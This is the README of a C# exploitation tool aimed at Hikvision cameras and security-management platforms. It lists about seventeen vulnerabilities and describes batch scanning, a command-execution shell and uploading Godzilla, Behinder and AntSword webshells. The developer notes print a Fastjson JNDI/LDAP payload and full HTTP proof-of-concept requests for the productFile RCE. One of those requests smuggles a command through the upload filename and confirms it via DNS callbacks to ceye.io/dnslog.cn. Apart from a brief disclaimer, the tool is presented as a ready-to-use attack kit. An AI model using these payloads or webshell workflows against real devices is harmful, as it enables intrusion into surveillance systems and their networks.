# Hikvision综合漏洞利用工具

没事写个工具，
程序采用C#开发,
首次使用请安装依赖：
NET8.0
声明：仅用于授权测试，用户滥用造成的一切后果和作者无关
请遵守法律法规！

https://dotnet.microsoft.com/zh-cn/download

海康威视综合漏洞利用工具 收录漏洞如下：

Hikvision 摄像头未授权访问漏洞

Hikvision 远程代码执行漏洞

Hikvision iVMS综合安防系统任意文件上传漏洞

Hikvision综合安防管理平台isecure center文件上传漏洞

Hikvision综合安防管理平台config信息泄露漏洞

Hikvision综合安防管理平台env信息泄漏漏洞

Hikvision综合安防管理平台report任意文件上传漏洞

Hikvision综合安防管理平台api session命令执行漏洞

Hikvision applyCT命令执行漏洞

Hikvision applyAutoLoginTicket命令执行漏洞

Hikvision keepAlive远程代码执行漏洞

Hikvision综合安防管理平台orgManage任意文件读取漏洞

Hikvision综合安防管理平台files任意文件读取漏洞

Hikvision综合安防管理平台detection远程命令执行漏洞

Hikvision综合安防管理平台productFile远程命令执行漏洞

Hikvision综合安防管理平台licenseExpire远程命令执行漏洞

Hikvision综合安防管理平台installation远程命令执行漏洞

# 功能介绍

批量检测模块：

模块如下：Hikvision 远程代码执行漏洞

Hikvision iVMS综合安防系统任意文件上传漏洞

Hikvision综合安防管理平台isecure center文件上传漏洞

Hikvision综合安防管理平台config信息泄露漏洞

Hikvision综合安防管理平台api session命令执行漏洞

Hikvision综合安防管理平台env信息泄漏漏洞

Hikvision applyAutoLoginTicket命令执行漏洞

Hikvision综合安防管理平台orgManage任意文件读取漏洞

Hikvision综合安防管理平台files任意文件读取漏洞

webshell利用模块
Hikvision iVMS综合安防系统任意文件上传漏洞

Hikvision综合安防管理平台isecure center文件上传漏洞

Hikvision综合安防管理平台report任意文件上传漏洞

cmshell命令执行模块

Hikvision 远程代码执行漏洞

Hikvision综合安防管理平台api session命令执行漏洞

Hikvision applyAutoLoginTicket命令执行漏洞

# 功能使用

默认模块可一键扫描所有漏洞

![image](https://github.com/MInggongK/Hikvision-/blob/main/e10adc3949ba59abbe56e057f20f883e.jpg)

选择模块可单独选择你要检测的模块，输入目标，点击选择模块即可检测漏洞

批量检测内置路径：/hikvision.txt
hikvision.txt文本放入你要检测的网站列表
默认批量检测，批量扫描所有模块的漏洞

选择模块，可单独选择你要检测的模块，点击选择模块即可

Cmdshell模块：
选择模块进行漏洞验证，如果存在，在cmdshell输入你要执行的命令即可

webshell利用模块：

内置Godzilla
Behinder
AntSword
cmd
四种类型的shell
一个测试文件

具体使用方法：选择模块进行验证
如isecure center
如果漏洞存在
可选择内置类型，如测试文件
点击getshell isecure上传即可



自定义上传
如果存在isecure漏洞
可自定义shell代码，
选择自定义模块
如自定义isecure
填入你要的shell代码，文件名，如demo.jsp
点击自定义上传即可

# 编写小记
Hikvision applyCT ceye api精准识别技巧
目前已取消，考虑到批量识别可能会阻塞网络，因此没有采取这个方法
{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://"\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"}
默认
默认插入POST json数据进行测试
访问api:
查找id:
id	"1870408864"
这里存在一个问题
如果dns缓存不清除，可能存在误判
{"meta": {"code": 200, "message": "OK"}, "data": [{"id": "1870408864", "name": "", "remote_addr": 
这里会造成误判，DNS缓存清除需要cookie
那么怎么不使用COOKIE解决这个问题呢？
可以直接在调用前，产生随机数
   Random random = new Random();
    int randomNumber = random.Next(1, 100); // 生成一个1到100之间的随机整数
   Console.WriteLine(randomNumber);
然后进行拼接：然后直接赋给   randomNumber + "." + textBox4.Text;
这样每一次生成都是会递增的循环产生随机数
如9090.38.22.xxxx.ceye.io
2222.9090.38.22.xxxx.ceye.io
3422342.9090.38.22.xxxx.ceye.io
通过访问API token,会查找ID值进行判断
http://api.ceye.io/v1/records?token=“token&type=dns&filter=
  if (s.Contains(3422342.9090.38.22.xxxx.ceye.io))
   {
比对发出的请求：
如96.93.13.4.90.38.22.2skv3a.ceye.io
没发出一次，自动生成1次，这样就判断精准了
取随机不断的递增，再递增去比较存在的值
如果找到，就存在漏洞，否则漏洞不存在
但是这个只适用于单个识别，批量识别还需要写另外验证方法

# 更新日志

Hikvision综合漏洞利用工具 v2.0版

增加了Hikvision综合安防管理平台productFile远程命令执行漏洞

增加了Hikvision综合安防管理平台licenseExpire远程命令执行漏洞

增加了Hikvision综合安防管理平台installation远程命令执行漏洞

licenseExpire自定义模块可用

installation自定义模块可用

productFile远程命令执行漏洞提供检测功能

后续版本优化


Hikvision综合漏洞利用工具 v1.8版

增加了Hikvision综合安防管理平台detection远程命令执行漏洞

增加了自定义detection利用模块

优化了Hikvision applyAutoLoginTicket命令执行漏洞

Hikvision综合漏洞利用工具 v1.7版

增加了Hikvision综合安防管理平台orgManage模块检测

增加了Hikvision综合安防管理平台files模块检测

感谢ling1uan提到的report请求构造体问题，已修复

# 更新小记

编写Hikvision综合安防管理平台productFile远程命令执行漏洞这个漏洞

是需要两步进行

很容易踩坑的点，访问try异常，数据处理失败

循环外判断，错误

漏洞针对的是海康威视部分综合安防管理平台历史版本，意味着漏洞的影响可能不会太多

第一个POC

GET /iac/iasService/v1/register HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: 

这个是获取token
理论上来讲，如果没有获取到token，漏洞可能不存在，那么获取到再读到的token进行两次判断
这样才能更好的检测漏洞

那么获取的token应该这样表示：
 string token = response.Headers["Token"];
 取token的Headers头
 因为这个页面默认是403，所以需要在403做判断，而不是直接状态的判断
 如：if (errorResponse.StatusCode == HttpStatusCode.Forbidden)
 不在异常处判断，是很容易踩坑的
 正确做法是在try异常处判断
 加入  catch (WebException ex)
这样去判断，先拿到token信息
接着，调用一个自定义函数方法
引用到第二个POC去判断

POST /svm/api/v1/productFile?type=product&ip=127.0.0.1&agentNo=1 HTTP/1.1
Host: 
Token: SElLIElnVTBzNVd6eWlibVB4M046dUE0SlBBbGJTWGNMUnk5aWg4dkJXL2RjeEdqKys4aTd0cHBMM09INytVZz0=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
Content-Length: 346

-----------------------------142851345723692939351758052805
Content-Disposition: form-data; name="file"; filename="`ping xxx.dnslog.cn`.zip"
Content-Type: application/zip

123
-----------------------------142851345723692939351758052805--

这里的话，重点是

"`ping xxx.dnslog.cn`.zip"

我们可以用本地的压缩包

那么本地就准备一个zip

内置了一个ceye(请勿修改）

然后这样要做精准判断的话

就是读取自定义的dns信息，随机叠加+自定义信息
正确写法：
  Random random = new Random();
  int randomNumber = random.Next(1, 100);
  string filePath = "`自定义信息`.zip"; 读取本地zip
   String filepath1 = randomNumber + "." + filePath; 叠加
     String filepath1 = randomNumber + "." + filePath;  叠加后的数据
   filepath1 = textBox5.Text; 传给一个控件
  request.Headers.Add("Token", token);加载读到的token

PIng写法:
空格："ping "

random random = new Random();

int randomNumber = random.Next(1, 100);

string filePath = “xxx.ceye.io”;

String filepath1 = randomNumber + “.” + filePath;

 String filepath2 = "`" +"ping "+ filepath1 + "`"+".zip";

  验证的话， 还是采用http://api.ceye.io/v1/records?token=去验证
  
   http://api.ceye.io/v1/records?token=+"token信息";
   
   采用了自定义内置ceye
   token是二次验证的
   代码其实如果没过
     if (statusCode == HttpStatusCode.OK)
  {
      if (a.Contains("0"))
      {
      这里就可以直接判断
      代码如果过了
      二次验证
      调用"http://api.ceye.io/v1/records?token=
      查找是否存在随机的ceye信息
   
      









